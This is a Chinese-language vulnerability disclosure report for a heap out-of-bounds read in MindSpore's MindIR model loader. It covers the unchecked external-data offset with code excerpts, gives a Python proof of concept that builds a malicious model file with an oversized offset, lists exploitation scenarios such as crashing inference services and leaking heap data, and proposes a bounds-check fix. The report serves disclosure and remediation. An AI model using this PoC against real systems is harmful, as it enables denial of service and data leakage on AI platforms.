标题: MindIR External Data Offset/Length 堆越界读取
报告日期: 2026-05-20

一、基本信息

项目名称:       MindSpore
项目地址:       https://gitee.com/mindspore/mindspore
                https://github.com/mindspore-ai/mindspore
影响版本:       2.9.0 (最新版本, pip install mindspore, 截至 2026-05-20)
运行平台:       x86_64 Linux
严重性:         High
CVSS 3.1 评分:  7.1 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H)
CWE 分类:       CWE-125 (Out-of-bounds Read)
攻击向量:       本地 / 需要用户加载恶意模型文件
影响组件:       mindspore/core/load_mindir/load_model.cc
                函数: MSANFModelParser::GetTensorDataFromExternal()


二、漏洞概述

MindSpore 在加载 MindIR 模型时, 从外部文件读取张量数据后, 使用 protobuf 中的
external_data.offset 字段作为源缓冲区偏移量, 通过 huge_memcpy 执行内存拷贝。
该 offset 值完全由模型文件控制, 且在文件读取路径中没有任何边界校验。

当 offset >= file_size 时, data + offset 指向已分配堆缓冲区之外的内存, 导致
堆越界读取 (Heap Buffer Over-Read)。

同一函数内 weight_buffer_ 分支有边界检查, 但文件读取分支却遗漏了, 属于
不一致安全逻辑缺陷。

此外, offset 直接参与指针运算且不经过 LongToSize 转换, 意味着负数 offset 也
可导致向低地址方向的越界读取。


三、影响分析

1. DoS (崩溃): 大 offset 指向未映射页面时触发 segfault, 进程终止
2. 信息泄露: 读取堆上相邻数据 (可能包含其他模型参数、密钥、用户数据)
3. ASLR 绕过辅助: 在某些条件下可泄露堆布局信息
4. 双向越界: 由于 offset 不经过 LongToSize 转换, 负数 offset 可向低地址
   方向越界读取, 攻击面比一般 OOB 更广 (正/负两个方向均可利用)


四、技术细节

4.1 漏洞根因: offset 直接参与指针运算, 无边界校验

文件: mindspore/core/load_mindir/load_model.cc
函数: MSANFModelParser::GetTensorDataFromExternal()

关键代码 (两个分支汇合后):

    auto ret =
      common::huge_memcpy(tensor_data_buf, tensor_info->DataNBytes(),
                          data + tensor_proto.external_data().offset(),
                          //    offset 直接参与指针运算, 无上限校验
                          //    如果 offset >= file_size, 越过堆缓冲区边界
                          LongToSize(tensor_proto.external_data().length()));

其中 data 指向从文件读取的堆缓冲区 (大小 = file_size)。

4.2 offset 不经过 LongToSize 转换

注意代码中:

    data + tensor_proto.external_data().offset()   // offset: int64_t 直接用
    LongToSize(tensor_proto.external_data().length())  // length: 经过转换

LongToSize 的实现 (convert_utils_base.h):

    inline size_t LongToSize(int64_t u) {
      if (u < 0) {
        MS_LOG(INTERNAL_EXCEPTION) << "The int64_t value(" << u
                                   << ") is less than 0.";
      }
      return static_cast<size_t>(u);
    }

offset 未经过此函数, 这意味着:
- 正值大 offset (如 0x7FFFFFFF): 向高地址越界读取
- 负值 offset (如 -4096): C++ 指针算术允许负偏移, 向低地址越界读取
两种方向的 OOB 都不会被任何检查拦截。

4.3 huge_memcpy / memcpy_s 不校验源地址

huge_memcpy 实现 (ms_utils_secure.h):

    static inline errno_t huge_memcpy(uint8_t *destAddr, size_t destMaxLen,
                                      const uint8_t *srcAddr, size_t srcLen) {
      while (destMaxLen > SECUREC_MEM_MAX_LEN && srcLen > SECUREC_MEM_MAX_LEN) {
        errno_t ret = memcpy_s(destAddr, SECUREC_MEM_MAX_LEN,
                               srcAddr, SECUREC_MEM_MAX_LEN);
        // ...分块拷贝
      }
      return memcpy_s(destAddr, destMaxLen, srcAddr, srcLen);
    }

memcpy_s 校验内容 (third_party/securec/src/memcpy_s.c):

    if (destMax == 0 || destMax > SECUREC_MEM_MAX_LEN) -> ERANGE
    if (dest == NULL || src == NULL) -> EINVAL
    if (count > destMax) -> ERANGE  // 只检查目标缓冲区是否够大
    // 重叠检查...

结论: memcpy_s 不会校验 srcAddr 是否指向合法分配的内存区域。它只保护目标
缓冲区不溢出, 不保护源地址不越界。当 data + offset 指向堆外时, 拷贝照常
执行, 产生 heap-buffer-overflow read。

4.4 同一函数内的安全逻辑不一致

weight_buffer_ 分支有边界检查:

    } else {
      data = reinterpret_cast<const unsigned char *>(weight_buffer_.first);
      if (LongToSize(tensor_proto.external_data().offset() +
                     tensor_proto.external_data().length()) >
          weight_buffer_.second) {
        MS_LOG(ERROR) << "Weight buffer doesn't match model, ...";
        return false;
      }
    }

文件读取分支没有同等检查:

    } else if (weight_buffer_.first == nullptr) {
      // Read file -> data 指向大小为 file_size 的堆缓冲区
      // 没有 offset + length 与 file_size 的比较
    }
    // ... 两个分支汇合后直接使用 data + offset ...


五、PoC (概念验证代码)

文件名: poc_002.py

    import os
    from mindspore.train.mind_ir_pb2 import ModelProto

    def create_oob_poc(output_dir="./oob_model"):
        os.makedirs(output_dir, exist_ok=True)

        # 创建 64 字节的小文件
        data_file = os.path.join(output_dir, "data.bin")
        with open(data_file, "wb") as f:
            f.write(b"\x01" + b"\x00" * 63)

        model = ModelProto()
        model.producer_name = "MindSpore"
        model.model_version = "1"
        model.little_endian = True

        graph = model.graph
        graph.name = "oob_graph"

        param = graph.parameter.add()
        param.name = "Default/param0:param0"
        param.data_type = 1
        param.dims.extend([256])

        # offset = 0x7FFFFFFF, 远超 64 字节文件大小
        param.external_data.location = "data.bin"
        param.external_data.offset = 0x7FFFFFFF
        param.external_data.length = 64

        mindir_path = os.path.join(output_dir, "oob_model.mindir")
        with open(mindir_path, "wb") as f:
            f.write(model.SerializeToString())

        print(f"[+] OOB PoC created: {mindir_path}")
        print(f"[+] File size: 64 bytes, offset: 0x7FFFFFFF (out of bounds!)")
        return mindir_path

    if __name__ == "__main__":
        create_oob_poc()

七、利用场景

场景 1: DoS 攻击
    大 offset 指向未映射页 -> segfault -> 服务崩溃
    适用于在线推理服务、AI 平台

场景 2: 堆数据泄露
    适当 offset -> 读取堆上相邻的 tensor / 字符串 / 配置数据
    适用于多租户 AI 平台

场景 3: 与 MS-2026-001 组合
    先用路径穿越读入已知文件 (控制堆布局), 再用 OOB 读相邻数据
    (理论可行, 需要进一步工程验证)


八、修复建议

在 huge_memcpy 调用之前添加边界校验, 与 weight_buffer_ 分支保持一致:

    int64_t offset_val = tensor_proto.external_data().offset();
    int64_t length_val = tensor_proto.external_data().length();

    // 检查 offset 非负
    if (offset_val < 0) {
      MS_LOG(ERROR) << "External data offset(" << offset_val
                    << ") is negative.";
      return false;
    }

    size_t offset = LongToSize(offset_val);
    size_t length = LongToSize(length_val);

    // 检查 offset + length 不超出数据缓冲区大小
    if (offset > data_size || length > data_size - offset) {
      MS_LOG(ERROR) << "External data offset(" << offset << ") + length("
                    << length << ") exceeds data buffer size("
                    << data_size << ").";
      return false;
    }

    auto ret = common::huge_memcpy(tensor_data_buf, tensor_info->DataNBytes(),
                                   data + offset, length);

注意: 修复需要在文件读取分支中记录 file_size 并传递到校验逻辑。
建议将 tenor_data_ 改为同时存储缓冲区大小。
